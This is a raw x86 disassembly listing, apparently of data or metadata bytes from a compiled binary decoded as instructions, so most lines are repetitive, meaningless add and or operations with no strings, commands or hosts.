  403630:	01 00                	add    %eax,(%eax)
  403632:	00 00                	add    %al,(%eax)
  403634:	00 00                	add    %al,(%eax)
  403636:	06                   	push   %es
  403637:	00 d1                	add    %dl,%cl
  403639:	04 dd                	add    $0xdd,%al
  40363b:	04 0a                	add    $0xa,%al
  40363d:	00 f2                	add    %dh,%dl
  40363f:	04 f9                	add    $0xf9,%al
  403641:	04 0e                	add    $0xe,%al
  403643:	00 00                	add    %al,(%eax)
  403645:	05 08 05 0a 00       	add    $0xa0508,%eax
  40364a:	1b 05 f9 04 0a 00    	sbb    0xa04f9,%eax
  403650:	27                   	daa
  403651:	05 2f 05 06 00       	add    $0x6052f,%eax
  403656:	4e                   	dec    %esi
  403657:	05 dd 04 0a 00       	add    $0xa04dd,%eax
  40365c:	53                   	push   %ebx
  40365d:	05 60 05 0a 00       	add    $0xa0560,%eax
  403662:	6a 05                	push   $0x5
  403664:	60                   	pusha
  403665:	05 0a 00 75 05       	add    $0x575000a,%eax
  40366a:	f9                   	stc
  40366b:	04 0a                	add    $0xa,%al
  40366d:	00 81 05 8f 05 0a    	add    %al,0xa058f05(%ecx)
  403673:	00 9b 05 f9 04 0a    	add    %bl,0xa04f905(%ebx)
  403679:	00 a0 05 f9 04 0a    	add    %ah,0xa04f905(%eax)
  40367f:	00 44 04 aa          	add    %al,-0x56(%esp,%eax,1)
  403683:	05 0a 00 bb 05       	add    $0x5bb000a,%eax
  403688:	c7 05 0a 00 dc 05 f9 	movl   $0xa04f9,0x5dc000a
  40368f:	04 0a 00 
  403692:	e1 05                	loope  0x403699
  403694:	ea 05 0e 00 fc 05 14 	ljmp   $0x1405,$0xfc000e05
  40369b:	06                   	push   %es
  40369c:	0e                   	push   %cs
  40369d:	00 29                	add    %ch,(%ecx)
  40369f:	06                   	push   %es
  4036a0:	14 06                	adc    $0x6,%al
  4036a2:	0a 00                	or     (%eax),%al
  4036a4:	36 06                	ss push %es
  4036a6:	f9                   	stc
  4036a7:	04 0a                	add    $0xa,%al
  4036a9:	00 48 06             	add    %cl,0x6(%eax)
  4036ac:	f9                   	stc
  4036ad:	04 0a                	add    $0xa,%al
  4036af:	00 56 06             	add    %dl,0x6(%esi)
  4036b2:	f9                   	stc
  4036b3:	04 0e                	add    $0xe,%al
  4036b5:	00 63 06             	add    %ah,0x6(%ebx)
  4036b8:	7c 06                	jl     0x4036c0
  4036ba:	0a 00                	or     (%eax),%al
  4036bc:	92                   	xchg   %eax,%edx
  4036bd:	06                   	push   %es
  4036be:	b2 06                	mov    $0x6,%dl
  4036c0:	0a 00                	or     (%eax),%al
  4036c2:	d2 06                	rolb   %cl,(%esi)
  4036c4:	b2 06                	mov    $0x6,%dl
  4036c6:	0a 00                	or     (%eax),%al
  4036c8:	f0 06                	lock push %es
  4036ca:	08 05 0a 00 04 07    	or     %al,0x704000a
  4036d0:	ea 05 0a 00 1b 07 ea 	ljmp   $0xea07,$0x1b000a05
  4036d7:	05 0a 00 38 07       	add    $0x738000a,%eax
  4036dc:	ea 05 0a 00 57 07 ea 	ljmp   $0xea07,$0x57000a05
  4036e3:	05 0a 00 70 07       	add    $0x770000a,%eax
  4036e8:	ea 05 0a 00 89 07 ea 	ljmp   $0xea07,$0x89000a05
  4036ef:	05 0a 00 a4 07       	add    $0x7a4000a,%eax
  4036f4:	ea 05 0a 00 bf 07 2f 	ljmp   $0x2f07,$0xbf000a05
  4036fb:	05 0a 00 cd 07       	add    $0x7cd000a,%eax
  403700:	ea 05 0a 00 ea 07 03 	ljmp   $0x307,$0xea000a05
  403707:	08 0a                	or     %cl,(%edx)
  403709:	00 1d 08 2f 05 0e    	add    %bl,0xe052f08
  40370f:	00 31                	add    %dh,(%ecx)
  403711:	08 48 08             	or     %cl,0x8(%eax)
  403714:	0a 00                	or     (%eax),%al
  403716:	60                   	pusha
  403717:	08 08                	or     %cl,(%eax)
  403719:	05 0a 00 7d 08       	add    $0x87d000a,%eax
  40371e:	b2 06                	mov    $0x6,%dl
  403720:	0a 00                	or     (%eax),%al
  403722:	98                   	cwtl
  403723:	08 f9                	or     %bh,%cl
  403725:	04 0a                	add    $0xa,%al
  403727:	00 9f 08 f9 04 27    	add    %bl,0x2704f908(%edi)
  40372d:	00 a6 08 00 00 0a    	add    %ah,0xa000008(%esi)
  403733:	00 b4 08 f9 04 0e 00 	add    %dh,0xe04f9(%eax,%ecx,1)
  40373a:	c6                   	(bad)
  40373b:	08 7c 06 67          	or     %bh,0x67(%esi,%eax,1)
  40373f:	00 db                	add    %bl,%bl
  403741:	08 00                	or     %al,(%eax)
  403743:	00 00                	add    %al,(%eax)
  403745:	00 00                	add    %al,(%eax)
  403747:	00 64 04 00          	add    %ah,0x0(%esp,%eax,1)
  40374b:	00 00                	add    %al,(%eax)
  40374d:	00 01                	add    %al,(%ecx)
  40374f:	00 01                	add    %al,(%ecx)
  403751:	00 81 01 10 00 6d    	add    %al,0x6d001001(%ecx)
  403757:	04 bb                	add    $0xbb,%al
  403759:	00 09                	add    %cl,(%ecx)
  40375b:	00 01                	add    %al,(%ecx)
  40375d:	00 01                	add    %al,(%ecx)
  40375f:	00 00                	add    %al,(%eax)
  403761:	00 10                	add    %dl,(%eax)
  403763:	00 75 04             	add    %dh,0x4(%ebp)
  403766:	7f 04                	jg     0x40376c
  403768:	09 00                	or     %eax,(%eax)
  40376a:	08 00                	or     %al,(%eax)
  40376c:	12 00                	adc    (%eax),%al
  40376e:	00 01                	add    %al,(%ecx)
  403770:	10 00                	adc    %al,(%eax)
  403772:	94                   	xchg   %eax,%esp
  403773:	04 7f                	add    $0x7f,%al
  403775:	04 45                	add    $0x45,%al
  403777:	00 0a                	add    %cl,(%edx)
  403779:	00 16                	add    %dl,(%esi)
  40377b:	00 00                	add    %al,(%eax)
  40377d:	01 00                	add    %eax,(%eax)
  40377f:	00 9d 04 00 00 09    	add    %bl,0x9000004(%ebp)
  403785:	00 0b                	add    %cl,(%ebx)
  403787:	00 19                	add    %bl,(%ecx)
  403789:	00 03                	add    %al,(%ebx)
  40378b:	01 00                	add    %eax,(%eax)
  40378d:	00 bc 04 00 00 4d 00 	add    %bh,0x4d0000(%esp,%eax,1)
  403794:	0b 00                	or     (%eax),%eax
  403796:	1a 00                	sbb    (%eax),%al
  403798:	11 00                	adc    %eax,(%eax)
  40379a:	c5 00                	lds    (%eax),%eax
  40379c:	cb                   	lret
  40379d:	01 31                	add    %esi,(%ecx)
  40379f:	00 d5                	add    %dl,%ch
  4037a1:	00 cb                	add    %cl,%bl
  4037a3:	01 11                	add    %edx,(%ecx)
  4037a5:	00 e0                	add    %ah,%al
  4037a7:	00 cb                	add    %cl,%bl
  4037a9:	01 51 80             	add    %edx,-0x80(%ecx)
  4037ac:	f9                   	stc
  4037ad:	00 ce                	add    %cl,%dh
  4037af:	01 11                	add    %edx,(%ecx)
  4037b1:	00 04 01             	add    %al,(%ecx,%eax,1)
  4037b4:	d1 01                	roll   $1,(%ecx)
  4037b6:	11 00                	adc    %eax,(%eax)
  4037b8:	0a 01                	or     (%ecx),%al
  4037ba:	d5 01                	aad    $0x1
  4037bc:	11 00                	adc    %eax,(%eax)
  4037be:	12 01                	adc    (%ecx),%al
  4037c0:	ce                   	into
  4037c1:	01 11                	add    %edx,(%ecx)
  4037c3:	00 1f                	add    %bl,(%edi)
  4037c5:	01 d8                	add    %ebx,%eax
  4037c7:	01 11                	add    %edx,(%ecx)
  4037c9:	00 2b                	add    %ch,(%ebx)
  4037cb:	01 dc                	add    %ebx,%esp
  4037cd:	01 11                	add    %edx,(%ecx)
  4037cf:	00 3b                	add    %bh,(%ebx)
  4037d1:	01 e0                	add    %esp,%eax
  4037d3:	01 48 20             	add    %ecx,0x20(%eax)
  4037d6:	00 00                	add    %al,(%eax)
  4037d8:	00 00                	add    %al,(%eax)
  4037da:	96                   	xchg   %eax,%esi
  4037db:	00 74 01 e8          	add    %dh,-0x18(%ecx,%eax,1)
  4037df:	01 01                	add    %eax,(%ecx)
  4037e1:	00 60 20             	add    %ah,0x20(%eax)
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	00 00                	add    %al,(%eax)
  4037e8:	91                   	xchg   %eax,%ecx
  4037e9:	00 79 01             	add    %bh,0x1(%ecx)
  4037ec:	ec                   	in     (%dx),%al
  4037ed:	01 01                	add    %eax,(%ecx)
  4037ef:	00 b0 20 00 00 00    	add    %dh,0x20(%eax)
  4037f5:	00 91 00 81 01 f2    	add    %dl,-0xdfe7f00(%ecx)
  4037fb:	01 02                	add    %eax,(%edx)
  4037fd:	00 58 24             	add    %bl,0x24(%eax)
  403800:	00 00                	add    %al,(%eax)
  403802:	00 00                	add    %al,(%eax)
  403804:	91                   	xchg   %eax,%ecx
  403805:	00 8e 01 f9 01 05    	add    %cl,0x501f901(%esi)
  40380b:	00 ec                	add    %ch,%ah
  40380d:	24 00                	and    $0x0,%al
  40380f:	00 00                	add    %al,(%eax)
  403811:	00 91 00 9d 01 fe    	add    %dl,-0x1fe6300(%ecx)
  403817:	01 06                	add    %eax,(%esi)
  403819:	00 00                	add    %al,(%eax)
  40381b:	00 00                	add    %al,(%eax)
  40381d:	00 80 00 91 20 01    	add    %al,0x1209100(%eax)
  403823:	00 02                	add    %al,(%edx)
  403825:	02 06                	add    (%esi),%al
  403827:	00 00                	add    %al,(%eax)
  403829:	00 00                	add    %al,(%eax)
  40382b:	00 80 00 91 20 12    	add    %al,0x12209100(%eax)
  403831:	00 0b                	add    %cl,(%ebx)
  403833:	02 0a                	add    (%edx),%cl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 00                	add    %al,(%eax)
  403839:	00 80 00 91 20 26    	add    %al,0x26209100(%eax)
  40383f:	00 10                	add    %dl,(%eax)
  403841:	02 0c 00             	add    (%eax,%eax,1),%cl
  403844:	00 00                	add    %al,(%eax)
  403846:	00 00                	add    %al,(%eax)
  403848:	80 00 91             	addb   $0x91,(%eax)
  40384b:	20 35 00 18 02 10    	and    %dh,0x10021800
  403851:	00 00                	add    %al,(%eax)
  403853:	00 00                	add    %al,(%eax)
  403855:	00 80 00 91 20 45    	add    %al,0x45209100(%eax)
  40385b:	00 1d 02 11 00 00    	add    %bl,0x1102
  403861:	00 00                	add    %al,(%eax)
  403863:	00 80 00 91 20 59    	add    %al,0x59209100(%eax)
  403869:	00 21                	add    %ah,(%ecx)
  40386b:	02 11                	add    (%ecx),%dl
  40386d:	00 00                	add    %al,(%eax)
  40386f:	00 00                	add    %al,(%eax)
  403871:	00 80 00 96 20 72    	add    %al,0x72209600(%eax)
  403877:	00 28                	add    %ch,(%eax)
  403879:	02 13                	add    (%ebx),%dl
  40387b:	00 00                	add    %al,(%eax)
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 80 00 91 20 7e    	add    %al,0x7e209100(%eax)
  403885:	00 2d 02 14 00 00    	add    %ch,0x1402
  40388b:	00 00                	add    %al,(%eax)
  40388d:	00 80 00 91 20 8f    	add    %al,-0x70df6f00(%eax)
  403893:	00 33                	add    %dh,(%ebx)
  403895:	02 16                	add    (%esi),%dl
  403897:	00 00                	add    %al,(%eax)
  403899:	00 00                	add    %al,(%eax)
  40389b:	00 80 00 91 20 a1    	add    %al,-0x5edf6f00(%eax)
  4038a1:	00 38                	add    %bh,(%eax)
  4038a3:	02 17                	add    (%edi),%dl
  4038a5:	00 00                	add    %al,(%eax)
  4038a7:	00 00                	add    %al,(%eax)
  4038a9:	00 80 00 91 20 ad    	add    %al,-0x52df6f00(%eax)
  4038af:	00 45 02             	add    %al,0x2(%ebp)
  4038b2:	1e                   	push   %ds
  4038b3:	00 50 25             	add    %dl,0x25(%eax)
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	00 00                	add    %al,(%eax)
  4038ba:	91                   	xchg   %eax,%ecx
  4038bb:	18 b2 01 e8 01 20    	sbb    %dh,0x2001e801(%edx)
  4038c1:	00 a4 25 00 00 00 00 	add    %ah,0x0(%ebp,%eiz,1)
  4038c8:	83 18 b9             	sbbl   $0xffffffb9,(%eax)
  4038cb:	01 4b 02             	add    %ecx,0x2(%ebx)
  4038ce:	20 00                	and    %al,(%eax)
  4038d0:	ac                   	lods   %ds:(%esi),%al
  4038d1:	25 00 00 00 00       	and    $0x0,%eax
  4038d6:	93                   	xchg   %eax,%ebx
  4038d7:	08 bf 01 4f 02 20    	or     %bh,0x20024f01(%edi)
  4038dd:	00 dc                	add    %bl,%ah
  4038df:	25 00 00 00 00       	and    $0x0,%eax
  4038e4:	93                   	xchg   %eax,%ebx
  4038e5:	08 d3                	or     %dl,%bl
  4038e7:	01 54 02 20          	add    %edx,0x20(%edx,%eax,1)
  4038eb:	00 e4                	add    %ah,%ah
  4038ed:	25 00 00 00 00       	and    $0x0,%eax
  4038f2:	93                   	xchg   %eax,%ebx
  4038f3:	08 df                	or     %bl,%bh
  4038f5:	01 59 02             	add    %ebx,0x2(%ecx)
  4038f8:	20 00                	and    %al,(%eax)
  4038fa:	ec                   	in     (%dx),%al
  4038fb:	25 00 00 00 00       	and    $0x0,%eax
  403900:	96                   	xchg   %eax,%esi
  403901:	08 eb                	or     %ch,%bl
  403903:	01 5f 02             	add    %ebx,0x2(%edi)
  403906:	21 00                	and    %eax,(%eax)
  403908:	f4                   	hlt
  403909:	25 00 00 00 00       	and    $0x0,%eax
  40390e:	86 18                	xchg   %bl,(%eax)
  403910:	b9 01 4b 02 21       	mov    $0x21024b01,%ecx
  403915:	00 fc                	add    %bh,%ah
  403917:	25 00 00 00 00       	and    $0x0,%eax
  40391c:	91                   	xchg   %eax,%ecx
  40391d:	18 b2 01 e8 01 21    	sbb    %dh,0x2101e801(%edx)
  403923:	00 14 26             	add    %dl,(%esi,%eiz,1)
  403926:	00 00                	add    %al,(%eax)
  403928:	00 00                	add    %al,(%eax)
  40392a:	93                   	xchg   %eax,%ebx
  40392b:	00 f7                	add    %dh,%bh
  40392d:	01 64 02 21          	add    %esp,0x21(%edx,%eax,1)
  403931:	00 00                	add    %al,(%eax)
  403933:	00 00                	add    %al,(%eax)
  403935:	00 03                	add    %al,(%ebx)
  403937:	00 86 18 b9 01 69    	add    %al,0x6901b918(%esi)
  40393d:	02 22                	add    (%edx),%ah
  40393f:	00 00                	add    %al,(%eax)
  403941:	00 00                	add    %al,(%eax)
  403943:	00 03                	add    %al,(%ebx)
  403945:	00 c6                	add    %al,%dh
  403947:	01 09                	add    %ecx,(%ecx)
  403949:	02 6f 02             	add    0x2(%edi),%ch
  40394c:	24 00                	and    $0x0,%al
  40394e:	00 00                	add    %al,(%eax)
  403950:	00 00                	add    %al,(%eax)
  403952:	03 00                	add    (%eax),%eax
  403954:	c6 01 10             	movb   $0x10,(%ecx)
  403957:	02 76 02             	add    0x2(%esi),%dh
  40395a:	27                   	daa
  40395b:	00 00                	add    %al,(%eax)
  40395d:	00 00                	add    %al,(%eax)
  40395f:	00 03                	add    %al,(%ebx)
  403961:	00 c6                	add    %al,%dh
  403963:	01 1c 02             	add    %ebx,(%edx,%eax,1)
  403966:	81 02 2c 00 00 00    	addl   $0x2c,(%edx)
  40396c:	01 00                	add    %eax,(%eax)
  40396e:	62 03                	bound  %eax,(%ebx)
  403970:	00 00                	add    %al,(%eax)
  403972:	01 00                	add    %eax,(%eax)
  403974:	67 03 00             	add    (%bx,%si),%eax
  403977:	00 02                	add    %al,(%edx)
  403979:	00 6d 03             	add    %ch,0x3(%ebp)
  40397c:	00 00                	add    %al,(%eax)
  40397e:	03 00                	add    (%eax),%eax
  403980:	74 03                	je     0x403985
  403982:	00 00                	add    %al,(%eax)
  403984:	01 00                	add    %eax,(%eax)
  403986:	7b 03                	jnp    0x40398b
  403988:	00 00                	add    %al,(%eax)
  40398a:	01 00                	add    %eax,(%eax)
  40398c:	82 03 00             	addb   $0x0,(%ebx)
  40398f:	00 02                	add    %al,(%edx)
  403991:	00 89 03 00 00 03    	add    %cl,0x3000003(%ecx)
  403997:	00 8e 03 00 00 04    	add    %cl,0x4000003(%esi)
  40399d:	00 93 03 00 20 00    	add    %dl,0x200003(%ebx)
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	00 01                	add    %al,(%ecx)
  4039a9:	00 9e 03 00 00 01    	add    %bl,0x1000003(%esi)
  4039af:	00 9e 03 00 00 02    	add    %bl,0x2000003(%esi)
  4039b5:	00 67 03             	add    %ah,0x3(%edi)
  4039b8:	00 00                	add    %al,(%eax)
  4039ba:	03 00                	add    (%eax),%eax
  4039bc:	6d                   	insl   (%dx),%es:(%edi)
  4039bd:	03 00                	add    (%eax),%eax
  4039bf:	00 04 00             	add    %al,(%eax,%eax,1)
  4039c2:	74 03                	je     0x4039c7
  4039c4:	00 00                	add    %al,(%eax)
  4039c6:	01 00                	add    %eax,(%eax)
  4039c8:	a2 03 00 00 01       	mov    %al,0x1000003
  4039cd:	00 af 03 02 00 02    	add    %ch,0x2000203(%edi)
  4039d3:	00 b4 03 00 00 01 00 	add    %dh,0x10000(%ebx,%eax,1)
  4039da:	c2 03 00             	ret    $0x3
  4039dd:	20 00                	and    %al,(%eax)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	00 01                	add    %al,(%ecx)
  4039e5:	00 ca                	add    %cl,%dl
  4039e7:	03 00                	add    (%eax),%eax
  4039e9:	00 01                	add    %al,(%ecx)
  4039eb:	00 d5                	add    %dl,%ch
  4039ed:	03 00                	add    (%eax),%eax
  4039ef:	00 01                	add    %al,(%ecx)
  4039f1:	00 de                	add    %bl,%dh
  4039f3:	03 00                	add    (%eax),%eax
  4039f5:	00 02                	add    %al,(%edx)
  4039f7:	00 e7                	add    %ah,%bh
  4039f9:	03 00                	add    (%eax),%eax
  4039fb:	00 03                	add    %al,(%ebx)
  4039fd:	00 ca                	add    %cl,%dl
  4039ff:	03 02                	add    (%edx),%eax
  403a01:	20 04 00             	and    %al,(%eax,%eax,1)
  403a04:	f1                   	int1
  403a05:	03 00                	add    (%eax),%eax
  403a07:	00 05 00 fa 03 00    	add    %al,0x3fa00
  403a0d:	00 06                	add    %al,(%esi)
  403a0f:	00 02                	add    %al,(%edx)
  403a11:	04 00                	add    $0x0,%al
  403a13:	00 07                	add    %al,(%edi)
  403a15:	00 09                	add    %cl,(%ecx)
  403a17:	04 00                	add    $0x0,%al
  403a19:	00 01                	add    %al,(%ecx)
  403a1b:	00 0f                	add    %cl,(%edi)
  403a1d:	04 00                	add    $0x0,%al
  403a1f:	00 02                	add    %al,(%edx)
  403a21:	00 15 04 00 00 01    	add    %dl,0x1000004
  403a27:	00 1e                	add    %bl,(%esi)
  403a29:	04 00                	add    $0x0,%al
  403a2b:	00 01                	add    %al,(%ecx)
  403a2d:	00 24 04             	add    %ah,(%esp,%eax,1)
  403a30:	00 00                	add    %al,(%eax)
  403a32:	01 00                	add    %eax,(%eax)
  403a34:	26 04 00             	es add $0x0,%al
  403a37:	00 02                	add    %al,(%edx)
  403a39:	00 2d 04 00 00 01    	add    %ch,0x1000004
  403a3f:	00 67 03             	add    %ah,0x3(%edi)
  403a42:	00 00                	add    %al,(%eax)
  403a44:	02 00                	add    (%eax),%al
  403a46:	6d                   	insl   (%dx),%es:(%edi)
  403a47:	03 00                	add    (%eax),%eax
  403a49:	00 03                	add    %al,(%ebx)
  403a4b:	00 74 03 00          	add    %dh,0x0(%ebx,%eax,1)
  403a4f:	00 01                	add    %al,(%ecx)
  403a51:	00 67 03             	add    %ah,0x3(%edi)
  403a54:	00 00                	add    %al,(%eax)
  403a56:	02 00                	add    (%eax),%al
  403a58:	6d                   	insl   (%dx),%es:(%edi)
  403a59:	03 00                	add    (%eax),%eax
  403a5b:	00 03                	add    %al,(%ebx)
  403a5d:	00 74 03 00          	add    %dh,0x0(%ebx,%eax,1)
  403a61:	00 04 00             	add    %al,(%eax,%eax,1)
  403a64:	34 04                	xor    $0x4,%al
  403a66:	00 00                	add    %al,(%eax)
  403a68:	05 00 26 04 00       	add    $0x42600,%eax
  403a6d:	00 01                	add    %al,(%ecx)
  403a6f:	00 3d 04 09 00 26    	add    %bh,0x26000904
  403a75:	02 e8                	add    %al,%ch
  403a77:	01 19                	add    %ebx,(%ecx)
  403a79:	00 2a                	add    %ch,(%edx)
  403a7b:	02 87 02 19 00 3c    	add    0x3c001902(%edi),%al
  403a81:	02 8c 02 21 00 4c 02 	add    0x24c0021(%edx,%eax,1),%cl
  403a88:	4b                   	dec    %ebx
  403a89:	02 41 01             	add    0x1(%ecx),%al
  403a8c:	54                   	push   %esp
  403a8d:	02 90 02 41 01 60    	add    0x60014102(%eax),%dl
  403a93:	02 95 02 29 00 6c    	add    0x6c002902(%ebp),%dl
  403a99:	02 9b 02 49 01 76    	add    0x76014902(%ebx),%bl
  403a9f:	02 8c 02 49 01 7e 02 	add    0x27e0149(%edx,%eax,1),%cl
  403aa6:	8c 02                	mov    %es,(%edx)
  403aa8:	11 00                	adc    %eax,(%eax)
  403aaa:	86 02                	xchg   %al,(%edx)
  403aac:	8c 02                	mov    %es,(%edx)
  403aae:	49                   	dec    %ecx
  403aaf:	01 8f 02 a0 02 49    	add    %ecx,0x4902a002(%edi)
  403ab5:	01 60 02             	add    %esp,0x2(%eax)
  403ab8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403ab9:	02 39                	add    (%ecx),%bh
  403abb:	00 b9 01 ad 02 41    	add    %bh,0x4102ad01(%ecx)
  403ac1:	00 96 02 b3 02 49    	add    %dl,0x4902b302(%esi)
  403ac7:	00 9c 02 fe 01 41 00 	add    %bl,0x4101fe(%edx,%eax,1)
  403ace:	a8 02                	test   $0x2,%al
  403ad0:	b3 02                	mov    $0x2,%bl
  403ad2:	51                   	push   %ecx
  403ad3:	00 b9 01 4b 02 19    	add    %bh,0x19024b01(%ecx)
  403ad9:	00 b2 02 b8 02 19    	add    %dh,0x1902b802(%edx)
  403adf:	00 c1                	add    %al,%cl
  403ae1:	02 8c 02 49 01 d5 02 	add    0x2d50149(%edx,%eax,1),%cl
  403ae8:	be 02 49 00 e8       	mov    $0xe8004902,%esi
  403aed:	02 c3                	add    %bl,%al
  403aef:	02 49 01             	add    0x1(%ecx),%cl
  403af2:	8f 02                	pop    (%edx)
  403af4:	ca 02 41             	lret   $0x4102
  403af7:	01 f6                	add    %esi,%esi
  403af9:	02 d5                	add    %ch,%dl
  403afb:	01 11                	add    %edx,(%ecx)
  403afd:	00 b9 01 4b 02 79    	add    %bh,0x79024b01(%ecx)
  403b03:	00 fb                	add    %bh,%bl
  403b05:	02 d0                	add    %al,%dl
  403b07:	02 79 00             	add    0x0(%ecx),%bh
  403b0a:	0d 03 d8 02 69       	or     $0x6902d803,%eax
  403b0f:	00 b9 01 dd 02 89    	add    %bh,-0x76fd22ff(%ecx)
  403b15:	00 b9 01 4b 02 91    	add    %bh,-0x6efdb4ff(%ecx)
  403b1b:	00 1a                	add    %bl,(%edx)
  403b1d:	03 e4                	add    %esp,%esp
  403b1f:	02 49 01             	add    0x1(%ecx),%cl
  403b22:	27                   	daa
  403b23:	03 eb                	add    %ebx,%ebp
  403b25:	02 49 01             	add    0x1(%ecx),%cl
  403b28:	31 03                	xor    %eax,(%ebx)
  403b2a:	f0 02 b1 00 b9 01 f4 	lock add -0xbfe4700(%ecx),%dh
  403b31:	02 b9 00 b9 01 fb    	add    -0x4fe4700(%ecx),%bh
  403b37:	02 c1                	add    %cl,%al
  403b39:	00 b9 01 4b 02 c9    	add    %bh,-0x36fdb4ff(%ecx)
  403b3f:	00 b9 01 00 03 d1    	add    %bh,-0x2efcffff(%ecx)
  403b45:	00 b9 01 b3 02 d9    	add    %bh,-0x26fd4cff(%ecx)
  403b4b:	00 b9 01 b3 02 e1    	add    %bh,-0x1efd4cff(%ecx)
  403b51:	00 b9 01 b3 02 e9    	add    %bh,-0x16fd4cff(%ecx)
  403b57:	00 b9 01 b3 02 f1    	add    %bh,-0xefd4cff(%ecx)
  403b5d:	00 b9 01 b3 02 f9    	add    %bh,-0x6fd4cff(%ecx)
  403b63:	00 b9 01 b3 02 01    	add    %bh,0x102b301(%ecx)
  403b69:	01 b9 01 b3 02 09    	add    %edi,0x902b301(%ecx)
  403b6f:	01 b9 01 b3 02 11    	add    %edi,0x1102b301(%ecx)
  403b75:	01 b9 01 b3 02 19    	add    %edi,0x1902b301(%ecx)
  403b7b:	01 b9 01 b3 02 21    	add    %edi,0x2102b301(%ecx)
  403b81:	01 b9 01 07 03 29    	add    %edi,0x29030701(%ecx)
  403b87:	01 b9 01 0c 03 31    	add    %edi,0x31030c01(%ecx)
  403b8d:	01 b9 01 4b 02 39    	add    %edi,0x39024b01(%ecx)
  403b93:	01 b9 01 4b 02 08    	add    %edi,0x8024b01(%ecx)
  403b99:	00 10                	add    %dl,(%eax)
  403b9b:	00 01                	add    %al,(%ecx)
  403b9d:	00 29                	add    %ch,(%ecx)
  403b9f:	00 03                	add    %al,(%ebx)
  403ba1:	01 06                	add    %eax,(%esi)
  403ba3:	00 2e                	add    %ch,(%esi)
  403ba5:	00 0b                	add    %cl,(%ebx)
  403ba7:	01 0f                	add    %ecx,(%edi)
  403ba9:	00 2e                	add    %ch,(%esi)
  403bab:	00 13                	add    %dl,(%ebx)
  403bad:	01 18                	add    %ebx,(%eax)
  403baf:	00 2e                	add    %ch,(%esi)
  403bb1:	00 1b                	add    %bl,(%ebx)
  403bb3:	01 37                	add    %esi,(%edi)
  403bb5:	00 2e                	add    %ch,(%esi)
  403bb7:	00 23                	add    %ah,(%ebx)
  403bb9:	01 40 00             	add    %eax,0x0(%eax)
  403bbc:	2e 00 2b             	add    %ch,%cs:(%ebx)
  403bbf:	01 4f 00             	add    %ecx,0x0(%edi)
  403bc2:	2e 00 33             	add    %dh,%cs:(%ebx)
  403bc5:	01 55 00             	add    %edx,0x0(%ebp)
  403bc8:	2e 00 3b             	add    %bh,%cs:(%ebx)
  403bcb:	01 5b 00             	add    %ebx,0x0(%ebx)
  403bce:	2e 00 43 01          	add    %al,%cs:0x1(%ebx)
  403bd2:	61                   	popa
  403bd3:	00 2e                	add    %ch,(%esi)
  403bd5:	00 4b 01             	add    %cl,0x1(%ebx)
  403bd8:	70 00                	jo     0x403bda
  403bda:	2e 00 53 01          	add    %dl,%cs:0x1(%ebx)
  403bde:	88 00                	mov    %al,(%eax)
  403be0:	2e 00 5b 01          	add    %bl,%cs:0x1(%ebx)
  403be4:	8e 00                	mov    (%eax),%es
  403be6:	2e 00 63 01          	add    %ah,%cs:0x1(%ebx)
  403bea:	b8 00 2e 00 6b       	mov    $0x6b002e00,%eax
  403bef:	01 c5                	add    %eax,%ebp
  403bf1:	00 2e                	add    %ch,(%esi)
  403bf3:	00 73 01             	add    %dh,0x1(%ebx)
  403bf6:	0d 01 49 00 03       	or     $0x3004901,%eax
  403bfb:	01 13                	add    %edx,(%ebx)
  403bfd:	01 63 00             	add    %esp,0x0(%ebx)
  403c00:	7b 01                	jnp    0x403c03
  403c02:	1c 01                	sbb    $0x1,%al
  403c04:	63 00                	arpl   %eax,(%eax)
  403c06:	83 01 5d             	addl   $0x5d,(%ecx)
  403c09:	01 63 00             	add    %esp,0x0(%ebx)
  403c0c:	8b 01                	mov    (%ecx),%eax
  403c0e:	62 01                	bound  %eax,(%ecx)
  403c10:	83 00 8b             	addl   $0xffffff8b,(%eax)
  403c13:	01 67 01             	add    %esp,0x1(%edi)
  403c16:	83 00 7b             	addl   $0x7b,(%eax)
  403c19:	01 6c 01 a3          	add    %ebp,-0x5d(%ecx,%eax,1)
  403c1d:	00 8b 01 c6 01 15    	add    %cl,0x1501c601(%ebx)
  403c23:	00 e4                	add    %ah,%ah
  403c25:	01 29                	add    %ebp,(%ecx)
  403c27:	00 e4                	add    %ah,%ah
  403c29:	01 35 00 e6 01 21    	add    %esi,0x2101e600
  403c2f:	03 27                	add    (%edi),%esp
  403c31:	03 34 03             	add    (%ebx,%eax,1),%esi
  403c34:	41                   	inc    %ecx
  403c35:	03 49 03             	add    0x3(%ecx),%ecx
  403c38:	03 00                	add    (%eax),%eax
  403c3a:	01 00                	add    %eax,(%eax)
  403c3c:	04 00                	add    $0x0,%al
  403c3e:	03 00                	add    (%eax),%eax
  403c40:	00 00                	add    %al,(%eax)
  403c42:	44                   	inc    %esp
  403c43:	04 12                	add    $0x12,%al
  403c45:	03 00                	add    (%eax),%eax
  403c47:	00 54 04 17          	add    %dl,0x17(%esp,%eax,1)
  403c4b:	03 00                	add    (%eax),%eax
  403c4d:	00 5c 04 1c          	add    %bl,0x1c(%esp,%eax,1)
  403c51:	03 02                	add    (%edx),%eax
  403c53:	00 13                	add    %dl,(%ebx)
  403c55:	00 03                	add    %al,(%ebx)
  403c57:	00 02                	add    %al,(%edx)
  403c59:	00 14 00             	add    %dl,(%eax,%eax,1)
  403c5c:	05 00 01 00 15       	add    $0x15000100,%eax
  403c61:	00 05 00 02 00 16    	add    %al,0x16000200
  403c67:	00 07                	add    %al,(%edi)
  403c69:	00 4a 03             	add    %cl,0x3(%edx)
  403c6c:	55                   	push   %ebp
  403c6d:	03 46 01             	add    0x1(%esi),%eax
  403c70:	0d 00 01 00 01       	or     $0x1000100,%eax
  403c75:	00 46 01             	add    %al,0x1(%esi)
  403c78:	0f 00 12             	lldt   (%edx)
  403c7b:	00 01                	add    %al,(%ecx)
  403c7d:	00 46 01             	add    %al,0x1(%esi)
  403c80:	11 00                	adc    %eax,(%eax)
  403c82:	26 00 01             	add    %al,%es:(%ecx)
  403c85:	00 46 01             	add    %al,0x1(%esi)
  403c88:	13 00                	adc    (%eax),%eax
  403c8a:	35 00 02 00 00       	xor    $0x200,%eax
  403c8f:	01 15 00 45 00 01    	add    %edx,0x1004500
